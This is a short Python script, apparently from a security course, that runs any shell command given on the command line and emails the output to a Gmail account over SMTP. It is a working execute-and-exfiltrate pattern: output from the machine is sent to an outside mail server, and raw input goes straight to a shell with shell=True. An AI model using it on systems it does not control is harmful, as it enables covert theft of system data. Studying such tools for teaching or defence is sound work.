#!/usr/bin/env python

import smtplib
import subprocess
import optparse


def getInput():
    parser = optparse.OptionParser(usage="Usage: execute_and_report [-e] [email] [-p] [password] ["
                                         "-c] [command]\nUsage "
                                         "Example:\texecute_and_report -e email@gmail.com -p Password"
                                         " -c \"ipconfig -all\"")
    parser.add_option("-e", "--email", dest="email", help="Specify email")
    parser.add_option("-p", "--password", dest="pwd", help="Specify Password")
    parser.add_option("-c", "--cmd", dest="cmd", help="Specify command to be executed in quotation")
    options = parser.parse_args()[0]
    return options


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


def main():
    options = getInput()
    if not options.email:
        print("[-] specify email")
    elif not options.pwd:
        print("[-] specify password")
    elif not options.cmd:
        print("[-] specify command to be run ")
    else:
        message = subprocess.check_output(options.cmd, shell=True)
        send_mail(options.email, options.pwd, message)

main()
